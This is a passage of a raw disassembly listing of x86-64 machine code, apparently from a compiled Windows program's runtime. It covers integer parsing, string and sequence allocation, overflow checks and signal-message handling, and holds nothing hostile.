    69689426:	4c 8d 7b 02          	lea    0x2(%rbx),%r15
    6968942a:	4c 89 fb             	mov    %r15,%rbx
    6968942d:	31 d2                	xor    %edx,%edx
    6968942f:	48 39 cb             	cmp    %rcx,%rbx
    69689432:	7d 10                	jge    0x69689444
    69689434:	44 0f b6 44 1f 10    	movzbl 0x10(%rdi,%rbx,1),%r8d
    6968943a:	45 8d 48 d0          	lea    -0x30(%r8),%r9d
    6968943e:	41 80 f9 09          	cmp    $0x9,%r9b
    69689442:	76 17                	jbe    0x6968945b
    69689444:	49 89 ef             	mov    %rbp,%r15
    69689447:	49 29 d7             	sub    %rdx,%r15
    6968944a:	3c 2d                	cmp    $0x2d,%al
    6968944c:	0f 84 92 00 00 00    	je     0x696894e4
    69689452:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
    69689456:	e9 89 00 00 00       	jmp    0x696894e4
    6968945b:	48 6b d2 0a          	imul   $0xa,%rdx,%rdx
    6968945f:	48 ff c3             	inc    %rbx
    69689462:	4a 8d 54 02 d0       	lea    -0x30(%rdx,%r8,1),%rdx
    69689467:	eb c6                	jmp    0x6968942f
    69689469:	48 8d 53 02          	lea    0x2(%rbx),%rdx
    6968946d:	44 8a 54 17 10       	mov    0x10(%rdi,%rdx,1),%r10b
    69689472:	49 89 d0             	mov    %rdx,%r8
    69689475:	41 80 fa 2d          	cmp    $0x2d,%r10b
    69689479:	75 04                	jne    0x6968947f
    6968947b:	4c 8d 43 03          	lea    0x3(%rbx),%r8
    6968947f:	45 31 db             	xor    %r11d,%r11d
    69689482:	31 c0                	xor    %eax,%eax
    69689484:	49 8d 58 01          	lea    0x1(%r8),%rbx
    69689488:	49 39 c8             	cmp    %rcx,%r8
    6968948b:	7d 11                	jge    0x6968949e
    6968948d:	46 0f b6 4c 07 10    	movzbl 0x10(%rdi,%r8,1),%r9d
    69689493:	45 84 c9             	test   %r9b,%r9b
    69689496:	74 06                	je     0x6968949e
    69689498:	41 80 f9 7d          	cmp    $0x7d,%r9b
    6968949c:	75 0d                	jne    0x696894ab
    6968949e:	49 ff cb             	dec    %r11
    696894a1:	74 31                	je     0x696894d4
    696894a3:	49 ff c8             	dec    %r8
    696894a6:	e9 81 00 00 00       	jmp    0x6968952c
    696894ab:	45 8d 41 d0          	lea    -0x30(%r9),%r8d
    696894af:	41 80 f8 09          	cmp    $0x9,%r8b
    696894b3:	77 16                	ja     0x696894cb
    696894b5:	48 6b c0 0a          	imul   $0xa,%rax,%rax
    696894b9:	4d 85 db             	test   %r11,%r11
    696894bc:	4a 8d 44 08 d0       	lea    -0x30(%rax,%r9,1),%rax
    696894c1:	75 0c                	jne    0x696894cf
    696894c3:	41 bb 01 00 00 00    	mov    $0x1,%r11d
    696894c9:	eb 04                	jmp    0x696894cf
    696894cb:	49 83 cb ff          	or     $0xffffffffffffffff,%r11
    696894cf:	49 89 d8             	mov    %rbx,%r8
    696894d2:	eb b0                	jmp    0x69689484
    696894d4:	4c 8d 78 ff          	lea    -0x1(%rax),%r15
    696894d8:	41 80 fa 2d          	cmp    $0x2d,%r10b
    696894dc:	75 06                	jne    0x696894e4
    696894de:	49 89 ef             	mov    %rbp,%r15
    696894e1:	49 29 c7             	sub    %rax,%r15
    696894e4:	4d 85 ff             	test   %r15,%r15
    696894e7:	78 05                	js     0x696894ee
    696894e9:	49 39 ef             	cmp    %rbp,%r15
    696894ec:	7c 05                	jl     0x696894f3
    696894ee:	e8 7f fd ff ff       	call   0x69689272
    696894f3:	4f 8d 3c fc          	lea    (%r12,%r15,8),%r15
    696894f7:	eb 64                	jmp    0x6968955d
    696894f9:	4c 89 fb             	mov    %r15,%rbx
    696894fc:	8a 44 1f 10          	mov    0x10(%rdi,%rbx,1),%al
    69689500:	89 c2                	mov    %eax,%edx
    69689502:	83 e2 df             	and    $0xffffffdf,%edx
    69689505:	83 ea 41             	sub    $0x41,%edx
    69689508:	80 fa 19             	cmp    $0x19,%dl
    6968950b:	76 3c                	jbe    0x69689549
    6968950d:	41 89 c0             	mov    %eax,%r8d
    69689510:	41 c0 e8 07          	shr    $0x7,%r8b
    69689514:	3c 5f                	cmp    $0x5f,%al
    69689516:	0f 94 c2             	sete   %dl
    69689519:	41 08 d0             	or     %dl,%r8b
    6968951c:	75 2b                	jne    0x69689549
    6968951e:	83 e8 30             	sub    $0x30,%eax
    69689521:	3c 09                	cmp    $0x9,%al
    69689523:	76 24                	jbe    0x69689549
    69689525:	4c 8d 43 ff          	lea    -0x1(%rbx),%r8
    69689529:	4c 89 fa             	mov    %r15,%rdx
    6968952c:	48 89 f9             	mov    %rdi,%rcx
    6968952f:	e8 8b e2 ff ff       	call   0x696877bf
    69689534:	49 89 e8             	mov    %rbp,%r8
    69689537:	4c 89 e2             	mov    %r12,%rdx
    6968953a:	48 89 c1             	mov    %rax,%rcx
    6968953d:	e8 10 a8 ff ff       	call   0x69683d52
    69689542:	48 85 c0             	test   %rax,%rax
    69689545:	79 0c                	jns    0x69689553
    69689547:	eb 44                	jmp    0x6968958d
    69689549:	48 ff c3             	inc    %rbx
    6968954c:	48 39 d9             	cmp    %rbx,%rcx
    6968954f:	74 d4                	je     0x69689525
    69689551:	eb a9                	jmp    0x696894fc
    69689553:	49 39 c6             	cmp    %rax,%r14
    69689556:	7e 35                	jle    0x6968958d
    69689558:	4d 8d 7c c4 08       	lea    0x8(%r12,%rax,8),%r15
    6968955d:	49 8b 07             	mov    (%r15),%rax
    69689560:	31 d2                	xor    %edx,%edx
    69689562:	48 85 c0             	test   %rax,%rax
    69689565:	74 03                	je     0x6968956a
    69689567:	48 8b 10             	mov    (%rax),%rdx
    6968956a:	48 8b 0e             	mov    (%rsi),%rcx
    6968956d:	e8 f1 e2 ff ff       	call   0x69687863
    69689572:	48 89 f1             	mov    %rsi,%rcx
    69689575:	48 89 c2             	mov    %rax,%rdx
    69689578:	e8 a8 ce ff ff       	call   0x69686425
    6968957d:	49 8b 17             	mov    (%r15),%rdx
    69689580:	48 8b 0e             	mov    (%rsi),%rcx
    69689583:	e8 16 84 ff ff       	call   0x6968199e
    69689588:	e9 93 fd ff ff       	jmp    0x69689320
    6968958d:	e8 e0 fc ff ff       	call   0x69689272
    69689592:	e9 89 fd ff ff       	jmp    0x69689320
    69689597:	48 83 c4 28          	add    $0x28,%rsp
    6968959b:	5b                   	pop    %rbx
    6968959c:	5e                   	pop    %rsi
    6968959d:	5f                   	pop    %rdi
    6968959e:	5d                   	pop    %rbp
    6968959f:	41 5c                	pop    %r12
    696895a1:	41 5d                	pop    %r13
    696895a3:	41 5e                	pop    %r14
    696895a5:	41 5f                	pop    %r15
    696895a7:	c3                   	ret
    696895a8:	56                   	push   %rsi
    696895a9:	53                   	push   %rbx
    696895aa:	48 83 ec 48          	sub    $0x48,%rsp
    696895ae:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    696895b5:	00 00 
    696895b7:	48 89 cb             	mov    %rcx,%rbx
    696895ba:	31 c9                	xor    %ecx,%ecx
    696895bc:	48 89 d6             	mov    %rdx,%rsi
    696895bf:	48 85 db             	test   %rbx,%rbx
    696895c2:	74 03                	je     0x696895c7
    696895c4:	48 8b 0b             	mov    (%rbx),%rcx
    696895c7:	31 c0                	xor    %eax,%eax
    696895c9:	48 85 f6             	test   %rsi,%rsi
    696895cc:	74 03                	je     0x696895d1
    696895ce:	48 8b 06             	mov    (%rsi),%rax
    696895d1:	48 01 c1             	add    %rax,%rcx
    696895d4:	e8 52 df ff ff       	call   0x6968752b
    696895d9:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
    696895de:	ba 08 00 00 00       	mov    $0x8,%edx
    696895e3:	4c 89 c1             	mov    %r8,%rcx
    696895e6:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
    696895eb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
    696895f0:	e8 d7 83 ff ff       	call   0x696819cc
    696895f5:	48 89 f1             	mov    %rsi,%rcx
    696895f8:	e8 dc e2 ff ff       	call   0x696878d9
    696895fd:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
    69689602:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
    69689607:	48 89 da             	mov    %rbx,%rdx
    6968960a:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    69689610:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
    69689615:	e8 e1 fc ff ff       	call   0x696892fb
    6968961a:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
    6968961f:	48 83 c4 48          	add    $0x48,%rsp
    69689623:	5b                   	pop    %rbx
    69689624:	5e                   	pop    %rsi
    69689625:	c3                   	ret
    69689626:	56                   	push   %rsi
    69689627:	53                   	push   %rbx
    69689628:	48 83 ec 38          	sub    $0x38,%rsp
    6968962c:	48 8b 0d cd ba 0f 00 	mov    0xfbacd(%rip),%rcx        # 0x69785100
    69689633:	48 85 c9             	test   %rcx,%rcx
    69689636:	74 0b                	je     0x69689643
    69689638:	48 83 c4 38          	add    $0x38,%rsp
    6968963c:	5b                   	pop    %rbx
    6968963d:	5e                   	pop    %rsi
    6968963e:	e9 3f f9 ff ff       	jmp    0x69688f82
    69689643:	48 8d 0d 96 bb 0f 00 	lea    0xfbb96(%rip),%rcx        # 0x697851e0
    6968964a:	ba 30 00 00 00       	mov    $0x30,%edx
    6968964f:	e8 03 dc ff ff       	call   0x69687257
    69689654:	48 8d 0d a5 53 00 00 	lea    0x53a5(%rip),%rcx        # 0x6968ea00
    6968965b:	48 89 c3             	mov    %rax,%rbx
    6968965e:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    69689662:	48 8d 05 37 bf 0f 00 	lea    0xfbf37(%rip),%rax        # 0x697855a0
    69689669:	48 89 03             	mov    %rax,(%rbx)
    6968966c:	48 8d 05 80 4e 00 00 	lea    0x4e80(%rip),%rax        # 0x6968e4f3
    69689673:	48 89 43 10          	mov    %rax,0x10(%rbx)
    69689677:	e8 5f da ff ff       	call   0x696870db
    6968967c:	48 85 f6             	test   %rsi,%rsi
    6968967f:	48 89 43 18          	mov    %rax,0x18(%rbx)
    69689683:	74 09                	je     0x6968968e
    69689685:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
    69689689:	e8 77 cd ff ff       	call   0x69686405
    6968968e:	48 c7 44 24 20 35 00 	movq   $0x35,0x20(%rsp)
    69689695:	00 00 
    69689697:	4c 8d 0d 63 4e 00 00 	lea    0x4e63(%rip),%r9        # 0x6968e501
    6968969e:	48 89 d9             	mov    %rbx,%rcx
    696896a1:	4c 8d 05 63 4e 00 00 	lea    0x4e63(%rip),%r8        # 0x6968e50b
    696896a8:	48 8d 15 44 4e 00 00 	lea    0x4e44(%rip),%rdx        # 0x6968e4f3
    696896af:	e8 58 f9 ff ff       	call   0x6968900c
    696896b4:	90                   	nop
    696896b5:	55                   	push   %rbp
    696896b6:	48 89 e5             	mov    %rsp,%rbp
    696896b9:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
    696896c0:	48 83 3d 60 bd 0f 00 	cmpq   $0x0,0xfbd60(%rip)        # 0x69785428
    696896c7:	00 
    696896c8:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
    696896cc:	48 89 55 18          	mov    %rdx,0x18(%rbp)
    696896d0:	c6 85 ef fe ff ff 01 	movb   $0x1,-0x111(%rbp)
    696896d7:	0f 84 a4 00 00 00    	je     0x69689781
    696896dd:	48 8b 05 e4 13 0f 00 	mov    0xf13e4(%rip),%rax        # 0x6977aac8
    696896e4:	48 8d 8d f0 fe ff ff 	lea    -0x110(%rbp),%rcx
    696896eb:	48 89 ea             	mov    %rbp,%rdx
    696896ee:	48 89 0d d3 13 0f 00 	mov    %rcx,0xf13d3(%rip)        # 0x6977aac8
    696896f5:	48 83 c1 10          	add    $0x10,%rcx
    696896f9:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
    69689700:	e8 6b 2c 00 00       	call   0x6968c370
    69689705:	48 98                	cltq
    69689707:	48 85 c0             	test   %rax,%rax
    6968970a:	48 89 85 f8 fe ff ff 	mov    %rax,-0x108(%rbp)
    69689711:	75 2c                	jne    0x6968973f
    69689713:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
    69689717:	e8 7c ec ff ff       	call   0x69688398
    6968971c:	48 89 c1             	mov    %rax,%rcx
    6968971f:	ff 15 03 bd 0f 00    	call   *0xfbd03(%rip)        # 0x69785428
    69689725:	48 8b 05 9c 13 0f 00 	mov    0xf139c(%rip),%rax        # 0x6977aac8
    6968972c:	c6 85 ef fe ff ff 00 	movb   $0x0,-0x111(%rbp)
    69689733:	48 8b 00             	mov    (%rax),%rax
    69689736:	48 89 05 8b 13 0f 00 	mov    %rax,0xf138b(%rip)        # 0x6977aac8
    6968973d:	eb 33                	jmp    0x69689772
    6968973f:	48 8b 05 82 13 0f 00 	mov    0xf1382(%rip),%rax        # 0x6977aac8
    69689746:	48 8d 0d b3 b9 0f 00 	lea    0xfb9b3(%rip),%rcx        # 0x69785100
    6968974d:	48 8b 00             	mov    (%rax),%rax
    69689750:	48 c7 85 f8 fe ff ff 	movq   $0x0,-0x108(%rbp)
    69689757:	00 00 00 00 
    6968975b:	48 89 05 66 13 0f 00 	mov    %rax,0xf1366(%rip)        # 0x6977aac8
    69689762:	48 8b 05 97 b9 0f 00 	mov    0xfb997(%rip),%rax        # 0x69785100
    69689769:	48 8b 50 28          	mov    0x28(%rax),%rdx
    6968976d:	e8 af cd ff ff       	call   0x69686521
    69689772:	48 83 bd f8 fe ff ff 	cmpq   $0x0,-0x108(%rbp)
    69689779:	00 
    6968977a:	74 05                	je     0x69689781
    6968977c:	e8 a5 fe ff ff       	call   0x69689626
    69689781:	8a 85 ef fe ff ff    	mov    -0x111(%rbp),%al
    69689787:	84 c0                	test   %al,%al
    69689789:	74 0e                	je     0x69689799
    6968978b:	48 8b 55 18          	mov    0x18(%rbp),%rdx
    6968978f:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
    69689793:	e8 67 b6 ff ff       	call   0x69684dff
    69689798:	90                   	nop
    69689799:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
    696897a0:	5d                   	pop    %rbp
    696897a1:	c3                   	ret
    696897a2:	57                   	push   %rdi
    696897a3:	48 83 ec 20          	sub    $0x20,%rsp
    696897a7:	4c 8d 05 91 4d 00 00 	lea    0x4d91(%rip),%r8        # 0x6968e53f
    696897ae:	83 f9 02             	cmp    $0x2,%ecx
    696897b1:	74 39                	je     0x696897ec
    696897b3:	4c 8d 05 a5 4d 00 00 	lea    0x4da5(%rip),%r8        # 0x6968e55f
    696897ba:	83 f9 0b             	cmp    $0xb,%ecx
    696897bd:	74 2d                	je     0x696897ec
    696897bf:	4c 8d 05 d7 4d 00 00 	lea    0x4dd7(%rip),%r8        # 0x6968e59d
    696897c6:	83 f9 16             	cmp    $0x16,%ecx
    696897c9:	74 21                	je     0x696897ec
    696897cb:	4c 8d 05 42 4d 00 00 	lea    0x4d42(%rip),%r8        # 0x6968e514
    696897d2:	83 f9 08             	cmp    $0x8,%ecx
    696897d5:	74 15                	je     0x696897ec
    696897d7:	4c 8d 05 51 4d 00 00 	lea    0x4d51(%rip),%r8        # 0x6968e52f
    696897de:	83 f9 04             	cmp    $0x4,%ecx
    696897e1:	48 8d 05 d5 4d 00 00 	lea    0x4dd5(%rip),%rax        # 0x6968e5bd
    696897e8:	4c 0f 44 c0          	cmove  %rax,%r8
    696897ec:	31 c0                	xor    %eax,%eax
    696897ee:	4c 89 c7             	mov    %r8,%rdi
    696897f1:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    696897f5:	f2 ae                	repnz scas (%rdi),%al
    696897f7:	48 89 ca             	mov    %rcx,%rdx
    696897fa:	4c 89 c1             	mov    %r8,%rcx
    696897fd:	48 f7 d2             	not    %rdx
    69689800:	48 8d 52 ff          	lea    -0x1(%rdx),%rdx
    69689804:	e8 ac fe ff ff       	call   0x696896b5
    69689809:	b9 01 00 00 00       	mov    $0x1,%ecx
    6968980e:	e8 2d 2e 00 00       	call   0x6968c640
    69689813:	90                   	nop
    69689814:	56                   	push   %rsi
    69689815:	53                   	push   %rbx
    69689816:	48 83 ec 38          	sub    $0x38,%rsp
    6968981a:	48 8d 0d 3f af 0f 00 	lea    0xfaf3f(%rip),%rcx        # 0x69784760
    69689821:	ba 30 00 00 00       	mov    $0x30,%edx
    69689826:	e8 2c da ff ff       	call   0x69687257
    6968982b:	48 8d 0d ce 50 00 00 	lea    0x50ce(%rip),%rcx        # 0x6968e900
    69689832:	48 89 c3             	mov    %rax,%rbx
    69689835:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    69689839:	48 8d 05 e0 b1 0f 00 	lea    0xfb1e0(%rip),%rax        # 0x69784a20
    69689840:	48 89 03             	mov    %rax,(%rbx)
    69689843:	48 8d 05 8f 4d 00 00 	lea    0x4d8f(%rip),%rax        # 0x6968e5d9
    6968984a:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6968984e:	e8 88 d8 ff ff       	call   0x696870db
    69689853:	48 85 f6             	test   %rsi,%rsi
    69689856:	48 89 43 18          	mov    %rax,0x18(%rbx)
    6968985a:	74 09                	je     0x69689865
    6968985c:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
    69689860:	e8 a0 cb ff ff       	call   0x69686405
    69689865:	48 c7 44 24 20 35 00 	movq   $0x35,0x20(%rsp)
    6968986c:	00 00 
    6968986e:	4c 8d 0d 8c 4c 00 00 	lea    0x4c8c(%rip),%r9        # 0x6968e501
    69689875:	48 89 d9             	mov    %rbx,%rcx
    69689878:	4c 8d 05 8c 4c 00 00 	lea    0x4c8c(%rip),%r8        # 0x6968e50b
    6968987f:	48 8d 15 53 4d 00 00 	lea    0x4d53(%rip),%rdx        # 0x6968e5d9
    69689886:	e8 81 f7 ff ff       	call   0x6968900c
    6968988b:	90                   	nop
    6968988c:	53                   	push   %rbx
    6968988d:	48 83 ec 20          	sub    $0x20,%rsp
    69689891:	4c 8b 41 18          	mov    0x18(%rcx),%r8
    69689895:	48 89 d3             	mov    %rdx,%rbx
    69689898:	49 8b 50 08          	mov    0x8(%r8),%rdx
    6968989c:	49 89 c9             	mov    %rcx,%r9
    6968989f:	b9 10 00 00 00       	mov    $0x10,%ecx
    696898a4:	e8 68 b7 ff ff       	call   0x69685011
    696898a9:	48 89 da             	mov    %rbx,%rdx
    696898ac:	49 0f af 10          	imul   (%r8),%rdx
    696898b0:	70 05                	jo     0x696898b7
    696898b2:	48 01 c2             	add    %rax,%rdx
    696898b5:	71 05                	jno    0x696898bc
    696898b7:	e8 58 ff ff ff       	call   0x69689814
    696898bc:	4c 89 c9             	mov    %r9,%rcx
    696898bf:	e8 93 d9 ff ff       	call   0x69687257
    696898c4:	48 89 18             	mov    %rbx,(%rax)
    696898c7:	48 89 58 08          	mov    %rbx,0x8(%rax)
    696898cb:	48 83 c4 20          	add    $0x20,%rsp
    696898cf:	5b                   	pop    %rbx
    696898d0:	c3                   	ret
    696898d1:	56                   	push   %rsi
    696898d2:	53                   	push   %rbx
    696898d3:	48 83 ec 28          	sub    $0x28,%rsp
    696898d7:	48 89 d3             	mov    %rdx,%rbx
    696898da:	31 d2                	xor    %edx,%edx
    696898dc:	48 85 c9             	test   %rcx,%rcx
    696898df:	48 89 ce             	mov    %rcx,%rsi
    696898e2:	74 03                	je     0x696898e7
    696898e4:	48 8b 11             	mov    (%rcx),%rdx
    696898e7:	31 c0                	xor    %eax,%eax
    696898e9:	48 85 db             	test   %rbx,%rbx
    696898ec:	74 03                	je     0x696898f1
    696898ee:	48 8b 03             	mov    (%rbx),%rax
    696898f1:	48 8d 0d 08 80 0f 00 	lea    0xf8008(%rip),%rcx        # 0x69781900
    696898f8:	48 01 c2             	add    %rax,%rdx
    696898fb:	e8 8c ff ff ff       	call   0x6968988c
    69689900:	31 c9                	xor    %ecx,%ecx
    69689902:	48 85 f6             	test   %rsi,%rsi
    69689905:	74 0a                	je     0x69689911
    69689907:	48 8b 0e             	mov    (%rsi),%rcx
    6968990a:	31 d2                	xor    %edx,%edx
    6968990c:	48 39 ca             	cmp    %rcx,%rdx
    6968990f:	7c 0f                	jl     0x69689920
    69689911:	48 85 db             	test   %rbx,%rbx
    69689914:	74 2d                	je     0x69689943
    69689916:	4c 8b 0b             	mov    (%rbx),%r9
    69689919:	31 d2                	xor    %edx,%edx
    6968991b:	48 01 c1             	add    %rax,%rcx
    6968991e:	eb 0f                	jmp    0x6968992f
    69689920:	44 8a 44 16 10       	mov    0x10(%rsi,%rdx,1),%r8b
    69689925:	44 88 44 10 10       	mov    %r8b,0x10(%rax,%rdx,1)
    6968992a:	48 ff c2             	inc    %rdx
    6968992d:	eb dd                	jmp    0x6968990c
    6968992f:	4c 39 ca             	cmp    %r9,%rdx
    69689932:	7d 0f                	jge    0x69689943
    69689934:	44 8a 44 13 10       	mov    0x10(%rbx,%rdx,1),%r8b
    69689939:	44 88 44 11 10       	mov    %r8b,0x10(%rcx,%rdx,1)
    6968993e:	48 ff c2             	inc    %rdx
    69689941:	eb ec                	jmp    0x6968992f
    69689943:	48 83 c4 28          	add    $0x28,%rsp
    69689947:	5b                   	pop    %rbx
    69689948:	5e                   	pop    %rsi
    69689949:	c3                   	ret
    6968994a:	56                   	push   %rsi
    6968994b:	53                   	push   %rbx
    6968994c:	48 83 ec 28          	sub    $0x28,%rsp
    69689950:	48 89 ce             	mov    %rcx,%rsi
    69689953:	48 89 d3             	mov    %rdx,%rbx
    69689956:	48 8d 0d a3 7f 0f 00 	lea    0xf7fa3(%rip),%rcx        # 0x69781900
    6968995d:	e8 2a ff ff ff       	call   0x6968988c
    69689962:	31 d2                	xor    %edx,%edx
    69689964:	48 39 da             	cmp    %rbx,%rdx
    69689967:	7d 0c                	jge    0x69689975
    69689969:	8a 0c 16             	mov    (%rsi,%rdx,1),%cl
    6968996c:	88 4c 10 10          	mov    %cl,0x10(%rax,%rdx,1)
    69689970:	48 ff c2             	inc    %rdx
    69689973:	eb ef                	jmp    0x69689964
    69689975:	48 83 c4 28          	add    $0x28,%rsp
    69689979:	5b                   	pop    %rbx
    6968997a:	5e                   	pop    %rsi
    6968997b:	c3                   	ret
    6968997c:	48 89 ca             	mov    %rcx,%rdx
    6968997f:	48 8d 0d 7a 7f 0f 00 	lea    0xf7f7a(%rip),%rcx        # 0x69781900
    69689986:	e9 01 ff ff ff       	jmp    0x6968988c
    6968998b:	57                   	push   %rdi
    6968998c:	56                   	push   %rsi
    6968998d:	53                   	push   %rbx
    6968998e:	48 83 ec 20          	sub    $0x20,%rsp
    69689992:	48 85 c9             	test   %rcx,%rcx
    69689995:	48 89 cb             	mov    %rcx,%rbx
    69689998:	48 89 d6             	mov    %rdx,%rsi
    6968999b:	74 68                	je     0x69689a05
    6968999d:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
    696899a4:	ff ff 3f 
    696899a7:	48 23 4b 08          	and    0x8(%rbx),%rcx
    696899ab:	48 3b 0b             	cmp    (%rbx),%rcx
    696899ae:	7f 6c                	jg     0x69689a1c
    696899b0:	e8 63 7f ff ff       	call   0x69681918
    696899b5:	48 89 f1             	mov    %rsi,%rcx
    696899b8:	48 89 c2             	mov    %rax,%rdx
    696899bb:	e8 cc fe ff ff       	call   0x6968988c
    696899c0:	48 8b 7e 18          	mov    0x18(%rsi),%rdi
    696899c4:	4c 8b 0b             	mov    (%rbx),%r9
    696899c7:	48 89 c1             	mov    %rax,%rcx
    696899ca:	49 89 c2             	mov    %rax,%r10
    696899cd:	48 8b 77 08          	mov    0x8(%rdi),%rsi
    696899d1:	4c 89 08             	mov    %r9,(%rax)
    696899d4:	48 89 f2             	mov    %rsi,%rdx
    696899d7:	e8 49 b6 ff ff       	call   0x69685025
    696899dc:	48 89 d9             	mov    %rbx,%rcx
    696899df:	48 89 f2             	mov    %rsi,%rdx
    696899e2:	49 89 c3             	mov    %rax,%r11
    696899e5:	e8 3b b6 ff ff       	call   0x69685025
    696899ea:	48 8b 0f             	mov    (%rdi),%rcx
    696899ed:	48 89 c6             	mov    %rax,%rsi
    696899f0:	4c 89 df             	mov    %r11,%rdi
    696899f3:	49 0f af c9          	imul   %r9,%rcx
    696899f7:	f3 a4                	rep movsb (%rsi),(%rdi)
    696899f9:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
    69689a00:	4c 89 d3             	mov    %r10,%rbx
    69689a03:	eb 17                	jmp    0x69689a1c
    69689a05:	ba 01 00 00 00       	mov    $0x1,%edx
    69689a0a:	48 89 f1             	mov    %rsi,%rcx
    69689a0d:	e8 7a fe ff ff       	call   0x6968988c
    69689a12:	48 89 c3             	mov    %rax,%rbx
    69689a15:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    69689a1c:	48 89 d8             	mov    %rbx,%rax
    69689a1f:	48 83 c4 20          	add    $0x20,%rsp
    69689a23:	5b                   	pop    %rbx
    69689a24:	5e                   	pop    %rsi
    69689a25:	5f                   	pop    %rdi
    69689a26:	c3                   	ret
    69689a27:	57                   	push   %rdi
    69689a28:	56                   	push   %rsi
    69689a29:	53                   	push   %rbx
    69689a2a:	48 83 ec 30          	sub    $0x30,%rsp
    69689a2e:	ba 30 00 00 00       	mov    $0x30,%edx
    69689a33:	48 89 cf             	mov    %rcx,%rdi
    69689a36:	48 8d 0d e3 b1 0f 00 	lea    0xfb1e3(%rip),%rcx        # 0x69784c20
    69689a3d:	e8 15 d8 ff ff       	call   0x69687257
    69689a42:	48 89 f9             	mov    %rdi,%rcx
    69689a45:	48 89 c3             	mov    %rax,%rbx
    69689a48:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    69689a4c:	48 8d 05 4d 2d 10 00 	lea    0x102d4d(%rip),%rax        # 0x6978c7a0
    69689a53:	48 89 03             	mov    %rax,(%rbx)
    69689a56:	48 8d 05 8b 4b 00 00 	lea    0x4b8b(%rip),%rax        # 0x6968e5e8
    69689a5d:	48 89 43 10          	mov    %rax,0x10(%rbx)
    69689a61:	e8 75 d6 ff ff       	call   0x696870db
    69689a66:	48 85 f6             	test   %rsi,%rsi
    69689a69:	48 89 43 18          	mov    %rax,0x18(%rbx)
    69689a6d:	74 08                	je     0x69689a77
    69689a6f:	48 89 f1             	mov    %rsi,%rcx
    69689a72:	e8 6e c9 ff ff       	call   0x696863e5
    69689a77:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
    69689a7b:	31 d2                	xor    %edx,%edx
    69689a7d:	e8 19 c9 ff ff       	call   0x6968639b
    69689a82:	4c 8d 0d 67 4b 00 00 	lea    0x4b67(%rip),%r9        # 0x6968e5f0
    69689a89:	48 89 d9             	mov    %rbx,%rcx
    69689a8c:	48 c7 44 24 20 8b 00 	movq   $0x8b,0x20(%rsp)
    69689a93:	00 00 
    69689a95:	4c 8d 05 5b 4b 00 00 	lea    0x4b5b(%rip),%r8        # 0x6968e5f7
    69689a9c:	48 8d 15 45 4b 00 00 	lea    0x4b45(%rip),%rdx        # 0x6968e5e8
    69689aa3:	e8 64 f5 ff ff       	call   0x6968900c
    69689aa8:	90                   	nop
    69689aa9:	41 54                	push   %r12
    69689aab:	55                   	push   %rbp
    69689aac:	57                   	push   %rdi
    69689aad:	56                   	push   %rsi
    69689aae:	53                   	push   %rbx
    69689aaf:	48 83 ec 20          	sub    $0x20,%rsp
    69689ab3:	4c 8d 25 46 4b 00 00 	lea    0x4b46(%rip),%r12        # 0x6968e600
    69689aba:	48 89 cf             	mov    %rcx,%rdi
    69689abd:	48 89 d1             	mov    %rdx,%rcx
    69689ac0:	48 89 d6             	mov    %rdx,%rsi
    69689ac3:	44 89 c5             	mov    %r8d,%ebp
    69689ac6:	e8 33 7e ff ff       	call   0x696818fe
    69689acb:	48 8d 15 2e 4b 00 00 	lea    0x4b2e(%rip),%rdx        # 0x6968e600
    69689ad2:	48 89 f9             	mov    %rdi,%rcx
    69689ad5:	49 89 c0             	mov    %rax,%r8
    69689ad8:	e8 5b 2b 00 00       	call   0x6968c638
    69689add:	89 c3                	mov    %eax,%ebx
    69689adf:	31 d2                	xor    %edx,%edx
    69689ae1:	48 85 f6             	test   %rsi,%rsi
    69689ae4:	48 63 c3             	movslq %ebx,%rax
    69689ae7:	74 03                	je     0x69689aec
    69689ae9:	48 8b 16             	mov    (%rsi),%rdx
    69689aec:	48 39 d0             	cmp    %rdx,%rax
    69689aef:	7d 44                	jge    0x69689b35
    69689af1:	80 7c 06 10 00       	cmpb   $0x0,0x10(%rsi,%rax,1)
    69689af6:	74 16                	je     0x69689b0e
    69689af8:	4c 8d 44 06 10       	lea    0x10(%rsi,%rax,1),%r8
    69689afd:	4c 89 e2             	mov    %r12,%rdx
    69689b00:	48 89 f9             	mov    %rdi,%rcx
    69689b03:	e8 30 2b 00 00       	call   0x6968c638
    69689b08:	85 c0                	test   %eax,%eax
    69689b0a:	7f 25                	jg     0x69689b31
    69689b0c:	eb 12                	jmp    0x69689b20
    69689b0e:	31 c9                	xor    %ecx,%ecx
    69689b10:	48 89 fa             	mov    %rdi,%rdx
    69689b13:	e8 18 2b 00 00       	call   0x6968c630
    69689b18:	85 c0                	test   %eax,%eax
    69689b1a:	75 04                	jne    0x69689b20
    69689b1c:	ff c3                	inc    %ebx
    69689b1e:	eb bf                	jmp    0x69689adf
    69689b20:	40 84 ed             	test   %bpl,%bpl
    69689b23:	74 10                	je     0x69689b35
    69689b25:	48 8d 0d 94 4c 00 00 	lea    0x4c94(%rip),%rcx        # 0x6968e7c0
    69689b2c:	e8 f6 fe ff ff       	call   0x69689a27
    69689b31:	01 c3                	add    %eax,%ebx
    69689b33:	eb aa                	jmp    0x69689adf
    69689b35:	48 83 c4 20          	add    $0x20,%rsp
